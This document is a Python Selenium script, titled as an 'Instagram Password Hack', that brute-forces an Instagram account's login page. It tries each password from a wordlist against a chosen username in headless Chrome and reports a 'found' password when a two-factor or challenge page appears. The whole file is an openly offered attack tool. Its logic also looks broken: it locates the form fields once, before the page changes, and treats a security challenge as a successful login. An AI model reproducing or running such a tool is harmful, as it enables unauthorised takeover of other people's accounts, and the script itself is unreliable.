from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import os

print("""
##################################
#  Instagram Password Hack.     #
#      Made by Black Hacker     #
##################################
""")

# User Input
username = input("Enter your Instagram username: ")
password_file = input("Enter your password wordlist file path: ")

# Chrome options for Termux
options = webdriver.ChromeOptions()
options.add_argument("--headless")  # Run in background
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")

# Start WebDriver
driver = webdriver.Chrome(options=options)

# Open Instagram
driver.get("https://www.instagram.com/accounts/login/")
time.sleep(5)

# Find username & password fields
username_input = driver.find_element(By.NAME, "username")
password_input = driver.find_element(By.NAME, "password")

# Read passwords from file
if not os.path.exists(password_file):
    print("[!] Password file not found!")
    driver.quit()
    exit()

with open(password_file, "r") as file:
    passwords = file.readlines()

# Try each password
for password in passwords:
    password = password.strip()
    
    # Clear fields
    username_input.clear()
    password_input.clear()
    
    # Enter credentials
    username_input.send_keys(username)
    password_input.send_keys(password)
    password_input.send_keys(Keys.RETURN)
    
    time.sleep(1)  # 1 second delay for faster testing

    # Check if login is successful
    if "two_factor" in driver.current_url or "challenge" in driver.current_url:
        print(f"[✔] Password Found: {password}")
        break
    else:
        print(f"[✘] Incorrect: {password}")

# Close browser
driver.quit()
